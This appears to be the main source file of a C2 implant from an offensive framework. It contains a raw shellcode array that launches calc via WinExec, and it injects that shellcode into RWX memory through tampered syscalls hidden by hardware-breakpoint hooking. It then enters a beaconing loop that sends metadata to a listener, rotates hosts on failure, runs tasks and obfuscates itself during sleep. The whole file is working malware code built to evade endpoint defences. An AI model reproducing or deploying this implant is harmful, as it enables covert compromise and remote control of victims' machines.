#include "../../headers/agent/agent.h"
#include "../../headers/package/package.h"
#include "../../headers/TaskController/TaskController.h"
#include "../../headers/helpers/ListManager.h"
#include "../../headers/agent/evasion/SleepObfu/SleepObfMain.h"
#include "../../headers/agent/evasion/syscalls/syscalls.h"


#ifdef _MSC_VER
// MSVC compiler
#define GET_ADDRESS_OF_RETURN_ADDRESS() _AddressOfReturnAddress()
#else
// Other compilers (e.g., GCC, Clang)
#define GET_ADDRESS_OF_RETURN_ADDRESS() ((void**)__builtin_frame_address(0)+1)
#endif


pAgent agent = { 0 };

unsigned char rawData[] = {
	0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
	0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
	0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
	0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
	0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
	0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
	0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
	0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
	0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

void AgentMain(PVOID RetAddr) {

	INT err;
	Agent Agent = { 0 };
	agent = &Agent;

	if ((err = init_agent()) != 0) {
		printf("[error] attempting to initialize agent\n");
	}

	if ((err = RegisterAgent()) != 0) {
		printf("[error] attempting to register agent\n");
	}

	agent->Walker->RetAddr = GET_ADDRESS_OF_RETURN_ADDRESS();

	if(!PopulateSyscallList())
		printf("[error] attempting to populate syscall list\n");

	//PHANDLE CurrThread;
	//TAMPER_SYSCALL(0x9607968A9BB2F104, CurrThread, THREAD_ALL_ACCESS, NULL, )
	PVOID BaseAddress = NULL;
	ULONG RegionSize = 0x100;
	DWORD dwOldPro = 0x00;
	HANDLE hThread = NULL;

	//TODO remove this test code. for syscall tampering.
	if(!InitHardwareBreakpointHooking())
		printf("[error] attempting to initialize hardware breakpoint hooking\n");

	TAMPER_SYSCALL(0x152BD196EC14D617, NtCurrentProcess(), &BaseAddress, 0x00, &RegionSize, MEM_COMMIT | MEM_RESERVE,
	               PAGE_READWRITE, NULL, NULL, NULL, NULL, NULL);

	TAMPER_SYSCALL(0x38881CF2AE25D62E, NtCurrentProcess(), &BaseAddress, &RegionSize, PAGE_EXECUTE_READWRITE, &dwOldPro,
		NULL, NULL, NULL, NULL, NULL, NULL);

	MemoryCopy(BaseAddress, rawData, sizeof(rawData));

	TAMPER_SYSCALL(0x12C236DC472A6662, &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), BaseAddress, NULL, FALSE,
		NULL, NULL, NULL, NULL);

	if(!HaltHardwareBreakpointHooking())
		return;

	AgentRoutine();

}

void AgentRoutine() {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig->CurrentHost->NumFailures++;
				if (agent->config->listenerConfig->CurrentHost->NumFailures >= MAX_HOST_FAILURES)
				{
					agent->config->listenerConfig->CurrentHost->NumFailures = 0;
					SelectHost(HOST_ROTATION_FAIL_OVER);
				}
			}
			agent->config->listenerConfig->CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {
			TaskingRoutine();
		}

		PerformSleepObf();
	}
}